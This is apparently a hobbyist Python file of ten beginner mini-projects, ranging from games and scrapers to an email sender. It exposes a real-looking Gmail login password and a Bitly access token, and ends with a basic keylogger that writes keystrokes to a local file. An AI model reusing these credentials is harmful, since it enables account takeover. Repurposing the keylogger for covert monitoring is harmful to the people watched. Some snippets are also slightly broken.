#Mini-project 1: Dice-rolling Simulator

##import random
##def rollDice():
##    num = random.randint(1,6)
##    print("The dice has rolled " + str(num) + "!")
##    again = input("Would you like to roll again(y or n)? ")
##    if again == "y":
##        rollDice()
##
##ans = input("Press \"P\" to roll the dice: ")
##if ans == "P":
##    rollDice()
##else:
##    print("Sorry, but you have not pressed the right button! As a punishment, you will never get to play this game!")

#Alternate Solution

##import random
##
##while True:
##    print("1. roll the dice        2. exit    ")
##    user = int(input("What do you want to do? "))
##    if user == 1:
##        num = random.randint(1,6)
##        print(num)
##    else:
##        break

##--------------------------------------------------------------------------------------------------------------------------------------------------------------------

#Mini-project 2: Guess the Number Game

##import random
##for x in range(3):
##    num = random.randint(1,10)
##    guess = int(input("Guess a random number between 1 and 10 inclusive: "))
##    if guess == num:
##        print(f"You guessed right, the number is {num}!")
##        break
##    else:
##        print("Sorry, you didn't guess it this time!")

##--------------------------------------------------------------------------------------------------------------------------------------------------------------------

#Mini-project 3: Random Password Generator

##import random
##seq = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()"
##num = int(input("Enter the length of your desired password: "))
##password = "".join(random.sample(seq, num))
##print(password)

##--------------------------------------------------------------------------------------------------------------------------------------------------------------------

#Mini-project 4: Binary Search

##nums = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
##nums.sort()
##first = 0
##last = len(nums) - 1
###mid = (first + last) // 2
##word = int(input("Enter the number to be searched: "))
##found = False
##while (first <= last and not found):
##    mid = (first + last) // 2
##    if nums[mid] == word:
##        print(f"Your number has been found at position {mid}!")
##        found = True
##    elif nums[mid] > word:
##        last = mid - 1
##        print(f"lower than {mid + 1}")
##    else:
##        first = mid + 1
##        print(f"higher than {mid + 1}")
##        
##if not found:
##    print("Your number has not been found!")

##--------------------------------------------------------------------------------------------------------------------------------------------------------------------

#Mini-project 5: Sending Emails Using Python

import smtplib
from email.message import EmailMessage

def sendEmail(to, sub, msg):
    print(f"Email to: {to}\nSend with subject: {sub}\nMessage: {msg}")
    email = EmailMessage()
    email['from'] = "Jerome Perera"
    email['to'] = f"{to}"
    email['subject'] = f"{sub}"
    email.set_content(f"{msg}")

    with smtplib.SMTP(host = 'smtp.gmail.com', port = 587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        smtp.login('goldencoyote1469@gmail.com', 'shanilka!$')
        smtp.send_message(email)
        print("Email send")
    pass
sendEmail("jerome.s.perera@gmail.com", "Hello", "Hello World")

##--------------------------------------------------------------------------------------------------------------------------------------------------------------------

#Mini-project 6 Part A: Get Links from Webpage

##from bs4 import BeautifulSoup
##from urllib.request import Request, urlopen
##import re
##
##articleURL = input("Enter the URL of the article you would like to read: ")
##req = Request(articleURL)
##html_page = urlopen(req)
##
##soup = BeautifulSoup(html_page, "lxml")
##
##links = []
##for link in soup.findAll('a'):
##    links.append(link.get('href'))
##
##print(links)

#Mini-project 6 Part B: Medium Article Reader

##import pyttsx3
##import requests
##from playsound import playsound
##from bs4 import BeautifulSoup
##engine = pyttsx3.init('sapi5')
##voices = engine.getProperty('voices')
##engine.setProperty('voice', voices[0].id)
##volume = engine.getProperty('volume')
##engine.setProperty('volume', 1.0)
##
##playsound('test.wav')
##engine.say("Hello world")
##engine.runAndWait()
##
##def speak(audio):
##    engine.say(audio)
##    #playsound(audioFile)
##    engine.runAndWait()
##
##articleURL = str(input("Enter the URL of the article you would like to read: "))
##html_page = requests.get(articleURL)
##soup = BeautifulSoup(html_page.text, 'html.parser')
##articles = []
##for i in range(len(soup.select('.p'))):
##    article = soup.select('.p')[i].getText().strip()
##    articles.append(article)
##articleURL = " ".join(articles)
##engine.save_to_file(articleURL, Users\ASUS_PCuser\Documents\Python-Pip\geobeeArticle.mp3)
##speak(articleURL)
##
##engine.runAndWait()

##--------------------------------------------------------------------------------------------------------------------------------------------------------------------

#Mini-project 7: Alarm Clock

##import datetime
##from playsound import playsound
##
##alarm_time = input("Enter the time you want the alarm to be set to(HH:MM:SS AM/PM): ")
###print(alarm_time)
##alarm_hour = alarm_time[0:2]
##alarm_minute = alarm_time[3:5]
##alarm_second = alarm_time[6:8]
##alarm_period = alarm_time[9:11].upper()
##print("Setting up alarm...")
###print(datetime.datetime.now())
##while True:
##    now = datetime.datetime.now()
##    current_hour = now.strftime("%I")
##    current_minute = now.strftime("%M")
##    current_second = now.strftime("%S")
##    current_period = now.strftime("%p")
##    if (alarm_period == current_period):
##        if(alarm_hour == current_hour):
##            if(alarm_minute == current_minute):
##                if(alarm_second == current_second):
##                    print("Wake up!")
##                    playsound('alarm_clock.wav')
##                    break

##--------------------------------------------------------------------------------------------------------------------------------------------------------------------

#Mini-project 8: URL Shortener

##import bitly_api
##BITLY_ACCESS_TOKEN = "2ecce145d4d300aee7034da6a1663b9e7ffe5623"
##access = bitly_api.Connection(access_token = BITLY_ACCESS_TOKEN)
##full_link = input("Enter the link to shorten: ")
##short_url = access.shorten(full_link)
##print('Short URL = ' + short_url['url'])

##--------------------------------------------------------------------------------------------------------------------------------------------------------------------

#Mini-project 9: Weather App

##from bs4 import BeautifulSoup
##import requests
##headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
##
##def weather(city):
##    city = city.replace(" ", "+")
##    res = requests.get(f"https://www.google.com/search?q=weather+{city}&oq=weather+{city}&aqs=chrome.0.35i39l2j0l4j46j69i60.6128j1j7&sourceid=chrome&ie=UTF-8", headers=headers)
##    print("Searching in google...\n")
##    if res.status_code == 200:
##        soup = BeautifulSoup(res.text, "html.parser")
##    else:
##        raise Exception("Your link is not working!")
##    location = soup.select('#wob_loc')[0].getText().strip()
##    time = soup.select('#wob_dts')[0].getText().strip()
##    info = soup.select('#wob_dc')[0].getText().strip()
##    weather = soup.select('#wob_tm')[0].getText().strip()
##    print(location)
##    print(time)
##    print(info)
##    print(weather + "°F")
##
##yourCity = input("Enter a city to find out its weather: ")
##weather(yourCity)

##--------------------------------------------------------------------------------------------------------------------------------------------------------------------

#Mini-project 10: Key Logger

##from pynput import keyboard
##import time
##keys = []
##
##def on_press(key):
##    global keys
##    try:
##        print("Alphanumeric key {0} pressed".format(key.char))
##    except AttributeError:
##        print("Special key {0} pressed".format(key))
##    keys.append(str(key).replace("'", ""))
##    main_string = "".join(keys)
##    print(main_string)
##    if len(main_string) > 15:
##        with open('key_logger.txt', 'a') as key_check:
##            key_check.write(main_string + "\n")
##            keys = []
##def on_release(key):
##    print("{0} released".format(key))
##    if key == keyboard.Key.esc:
##        raise Exception("Program ended!")
##        key_check.close()
##        return false #Stop Listener
##
##with keyboard.Listener(on_press = on_press, on_release = on_release) as listener:
##    listener.join()
